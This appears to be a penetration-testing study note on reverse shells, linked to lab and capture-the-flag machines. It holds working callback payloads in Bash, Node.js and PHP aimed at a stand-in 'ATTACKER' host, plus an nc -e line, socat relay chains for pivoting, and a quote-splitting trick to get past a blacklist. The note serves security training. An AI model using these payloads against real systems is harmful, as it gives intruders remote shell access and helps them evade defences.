---
type: technique
tags: [ejpt:host-net-pentest]
tools: [netcat]
cves: []
related: [[cron-job-abuse]]
---

# Reverse Shells

Opening a connection from the target back to the attacker to gain an interactive shell.

## Common payloads

Bash:

```sh
sh -i >& /dev/tcp/ATTACKER/443 0>&1
```

Node.js (uploaded as a `.js` file):

```js
(function(){
    var net = require("net"), cp = require("child_process"), sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4444, "ATTACKER", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });
    return /a/;
})();
```

PHP:

```php
<?php $sock=fsockopen("ATTACKER",443); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

> The full pentestmonkey PHP reverse shell was uploaded via anonymous FTP → [[web-shell-upload]] in [[anonymous-pingu]].

## Stabilizing the shell

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
script /dev/null -c bash
```

## Detaching from a short-lived parent

A shell spawned by a one-shot request/command ([[shellshock]], exim `${run{}}`, etc.) dies when its parent exits. Background it *and* detach it:

```sh
nohup bash -i >& /dev/tcp/ATTACKER/443 0>&1 &
```

`&` alone backgrounds but leaves the process in the parent's group; `nohup`/`setsid` detach it so it survives.

## Getting the callback back through a pivot

If the target can't route to your box, don't fight it — relay the path with [[socat]], one listener per hop:

```sh
# on the hop nearest you
./socat tcp-l:4443,fork,reuseaddr tcp:ATTACKER:443
# on the next hop out
./socat tcp-l:4444,fork,reuseaddr tcp:<neighbor>:4443
```

The payload then points at its *local* neighbor's relay port, and the chain carries the connection home ([[littlepivoting]] manual run).

## Seen in

[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]] (base64 `sh -i` via [[command-injection]]), [[bruteshock]] (nohup `bash -i` via [[shellshock]]), [[littlepivoting]] (`/bin/bash -i >& /dev/tcp/…` over the pivot, pentestmonkey PHP shell on `upload`; manual re-run chained [[socat]] relays back to Kali), [[internal]] (quote-split `ba's'h -c 'bas''h -i >& /dev/tcp/…'` to slip a blacklist — [[waf-bypass]]), [[dark]] (`nc -e /bin/bash 20.20.20.2 4444` fired through a `cmd` POST field — the callback targets the *pivot's* inner IP, so the listener side needs a relay; the writeup doesn't show it)

> Node inspector tip ([[autoescuela]]): spawn the shell with async `exec()`/`spawn()`, not `execSync()` — the sync form blocks the event loop and freezes the app.
